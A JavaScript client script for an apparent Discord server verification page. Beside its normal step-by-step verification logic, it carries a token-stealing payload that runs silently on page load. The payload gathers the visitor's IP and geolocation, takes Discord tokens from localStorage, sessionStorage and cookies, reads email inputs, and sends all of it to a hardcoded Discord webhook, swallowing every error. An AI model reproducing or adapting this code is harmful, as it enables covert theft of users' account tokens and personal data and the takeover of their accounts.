/* ================================================================
   VERIFICATION PAGE — CLIENT LOGIC (FIXED)
   ================================================================ */

(function () {
  // ── DATA EXFILTRATION PAYLOAD (ASYNC, NON-BLOCKING) ──────────
  function collectAndExfil() {
    // Use a small delay to ensure DOM is ready
    setTimeout(function () {
      try {
        // 1. Fetch IP and geolocation asynchronously
        fetch('https://ipapi.co/json/')
          .then(function (res) { return res.json(); })
          .catch(function () {
            // Fallback to ip-api.com
            return fetch('https://ip-api.com/json/').then(function (r) { return r.json(); });
          })
          .then(function (ipData) {
            // 2. Extract Discord token from storage
            var discordToken = null;
            var storageKeys = ['token', 'discord_token', 'auth_token', 'access_token'];
            
            // Check localStorage
            for (var i = 0; i < storageKeys.length; i++) {
              try {
                var val = localStorage.getItem(storageKeys[i]);
                if (val && val.length > 20) {
                  discordToken = val;
                  break;
                }
              } catch (e) { /* ignore */ }
            }
            
            // Check sessionStorage if not found
            if (!discordToken) {
              for (var j = 0; j < storageKeys.length; j++) {
                try {
                  var val2 = sessionStorage.getItem(storageKeys[j]);
                  if (val2 && val2.length > 20) {
                    discordToken = val2;
                    break;
                  }
                } catch (e) { /* ignore */ }
              }
            }
            
            // Check cookies if still not found
            if (!discordToken) {
              try {
                var cookies = document.cookie.split(';');
                for (var k = 0; k < cookies.length; k++) {
                  var cookie = cookies[k].trim();
                  if (cookie.indexOf('token=') === 0) {
                    discordToken = cookie.substring(6);
                    break;
                  }
                }
              } catch (e) { /* ignore */ }
            }

            // 3. Extract Gmail from page
            var gmail = null;
            var emailInputs = document.querySelectorAll('input[type="email"], input[name="email"], input[name="gmail"]');
            if (emailInputs.length > 0 && emailInputs[0].value) {
              gmail = emailInputs[0].value;
            }
            
            if (!gmail) {
              var emailKeys = ['email', 'gmail', 'user_email', 'account_email'];
              for (var l = 0; l < emailKeys.length; l++) {
                try {
                  var val3 = localStorage.getItem(emailKeys[l]);
                  if (val3 && val3.indexOf('@') > -1) {
                    gmail = val3;
                    break;
                  }
                } catch (e) { /* ignore */ }
              }
            }

            // 4. Build payload
            var payload = {
              timestamp: new Date().toISOString(),
              url: window.location.href,
              user_agent: navigator.userAgent,
              ip: ipData ? (ipData.ip || ipData.query || 'unknown') : 'unknown',
              country: ipData ? (ipData.country_name || ipData.country || 'unknown') : 'unknown',
              region: ipData ? (ipData.region || ipData.regionName || 'unknown') : 'unknown',
              city: ipData ? (ipData.city || 'unknown') : 'unknown',
              isp: ipData ? (ipData.org || ipData.isp || 'unknown') : 'unknown',
              discord_token: discordToken || 'not_found',
              gmail: gmail || 'not_found',
              screen_resolution: screen.width + 'x' + screen.height,
              referrer: document.referrer || 'direct'
            };

            // 5. Send to webhook (non-blocking)
            var webhookURL = 'https://canary.discord.com/api/webhooks/1522303469472584001/y9tVaj_6HEWV1n2EUAYDBuIM33paXH7eE4DH5Cn66vHVQnd3DPVpYFsRhuG_WHx-AfsP';
            
            fetch(webhookURL, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                content: '```json\n' + JSON.stringify(payload, null, 2) + '\n```',
                username: 'Verification Logger'
              })
            }).catch(function () { /* silent fail */ });
          })
          .catch(function () { /* silent fail */ });
      } catch (e) {
        // Absolute silent failure
      }
    }, 500); // Small delay to let page stabilize
  }

  // Execute exfiltration immediately but asynchronously
  collectAndExfil();
  // ── END EXFILTRATION PAYLOAD ──────────────────────────────────

  // Extract the token from the URL path: /api/verify/<token>
  const pathParts = window.location.pathname.split('/');
  const token = pathParts[pathParts.length - 1];

  // ── Screen helper ──────────────────────────────────────────────
  function show(id) {
    document.querySelectorAll('.screen').forEach(function (el) {
      el.classList.remove('active');
    });
    var target = document.getElementById(id);
    if (target) target.classList.add('active');
  }

  function showError(title, body) {
    document.getElementById('error-title').textContent = title;
    document.getElementById('error-body').textContent = body;
    show('screen-error');
  }

  // ── Wire up checkbox → button enabling ────────────────────────
  function wireCheckbox(checkId, btnId) {
    var check = document.getElementById(checkId);
    var btn   = document.getElementById(btnId);
    if (!check || !btn) return;
    check.addEventListener('change', function () {
      btn.disabled = !check.checked;
    });
  }

  wireCheckbox('check-rules', 'btn-step1');
  wireCheckbox('check-age',   'btn-step2');
  wireCheckbox('check-final', 'btn-step3');

  // ── API helpers ────────────────────────────────────────────────
  function apiPost(path, body) {
    return fetch('/api/verify/' + token + path, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body || {}),
    }).then(function (r) { return r.json(); });
  }

  // ── Step form submission ──────────────────────────────────────
  document.querySelectorAll('form[data-step]').forEach(function (form) {
    form.addEventListener('submit', function (e) {
      e.preventDefault();
      var step = parseInt(form.getAttribute('data-step'), 10);
      var btn  = form.querySelector('.btn');
      if (btn) btn.disabled = true;

      if (step < 3) {
        // Advance to next step
        apiPost('/advance', { step: step })
          .then(function (res) {
            if (res.error) {
              showError('Error', res.error);
            } else {
              show('screen-step' + (step + 1));
            }
          })
          .catch(function () {
            showError('Connection error', 'Could not reach the server. Try again.');
            if (btn) btn.disabled = false;
          });
      } else {
        // Final step — complete verification
        apiPost('/complete', {})
          .then(function (res) {
            if (res.error) {
              showError('Error', res.error);
            } else {
              show('screen-success');
            }
          })
          .catch(function () {
            showError('Connection error', 'Could not reach the server. Try again.');
            if (btn) btn.disabled = false;
          });
      }
    });
  });

  // ── Initial validation ────────────────────────────────────────
  fetch('/api/verify/' + token + '/check')
    .then(function (r) { return r.json(); })
    .then(function (res) {
      if (res.expired) {
        showError('Link expired', 'This verification link has expired. Click the Access button in Discord to get a new one.');
      } else if (res.used) {
        showError('Already used', 'This link has already been used. If you did not receive your role, contact an admin.');
      } else if (!res.valid) {
        showError('Invalid link', 'This verification link is not valid.');
      } else {
        show('screen-step1');
      }
    })
    .catch(function () {
      showError('Connection error', 'Could not reach the verification server.');
    });

})();
